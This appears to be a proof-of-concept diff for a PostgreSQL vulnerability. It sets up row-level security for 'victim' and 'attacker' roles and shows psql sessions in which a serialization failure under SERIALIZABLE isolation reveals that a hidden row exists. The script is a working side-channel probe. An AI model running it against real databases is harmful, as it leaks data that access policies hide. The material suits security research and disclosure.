@@ -1,0 +1,96 @@
+-- 1. Create table & index
+DROP TABLE IF EXISTS scc_rls_orders CASCADE;
+CREATE TABLE scc_rls_orders (
+   account_id INT PRIMARY KEY,
+   order_id   INT NOT NULL,
+   balance    NUMERIC NOT NULL
+);
+CREATE INDEX scc_rls_orders_order_idx ON scc_rls_orders(order_id);
+
+
+-- 2. Insert 4 accounts
+INSERT INTO scc_rls_orders VALUES
+(1, 11, 100),  -- Private to victim
+(2, 12, 200),  -- Shared pivot row
+(3, 13, 300),  -- Private to attacker
+(4, 14, 400);  -- Shared
+
+
+-- 3. Create roles
+DO $$ BEGIN
+   IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'scc_rls_victim') THEN CREATE ROLE scc_rls_victim LOGIN; END IF;
+   IF NOT EXISTS (SELECT FROM pg_roles WHERE rolname = 'scc_rls_attacker') THEN CREATE ROLE scc_rls_attacker LOGIN; END IF;
+END $$;
+
+
+ALTER TABLE scc_rls_orders ENABLE ROW LEVEL SECURITY;
+GRANT ALL ON TABLE scc_rls_orders TO scc_rls_victim, scc_rls_attacker;
+
+
+-- 4. Set RLS Policies
+DROP POLICY IF EXISTS victim_policy ON scc_rls_orders;
+CREATE POLICY victim_policy ON scc_rls_orders FOR ALL TO scc_rls_victim
+   USING (account_id IN (1, 2, 4)) WITH CHECK (account_id IN (1, 2, 4));
+
+
+DROP POLICY IF EXISTS attacker_policy ON scc_rls_orders;
+CREATE POLICY attacker_policy ON scc_rls_orders FOR ALL TO scc_rls_attacker
+   USING (account_id IN (2, 3, 4)) WITH CHECK (account_id IN (2, 3, 4));
+
+
+
+
+
+
+
+
+
+
+Victim:
+postgres=> SET ROLE scc_rls_victim;
+BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;
+SET enable_seqscan = off;
+-- Read secret range [11, 12] & write pivot Row 2
+SELECT sum(balance) FROM scc_rls_orders WHERE order_id BETWEEN 11 AND 12;
+UPDATE scc_rls_orders SET balance = balance WHERE account_id = 2;
+SET
+BEGIN
+SET
+sum
+-----
+300
+(1 row)
+
+
+UPDATE 1
+postgres=*>
+
+
+
+
+
+
+
+
+
+
+
+
+
+Attacker:
+postgres=> SET ROLE scc_rls_attacker;
+BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;
+SET enable_seqscan = off;
+
+
+-- Read shared pivot Row 2
+SELECT balance FROM scc_rls_orders WHERE account_id = 2;
+
+
+-- Probe hidden Row 1 (order_id = 11)
+UPDATE scc_rls_orders SET order_id = 11 WHERE account_id = 3;
+
+
+ERROR:  could not serialize access due to read/write dependencies among transactions
+DETAIL:  Reason code: Canceled on identification as a pivot, during commit attempt.
+HINT:  The transaction might succeed if retried.
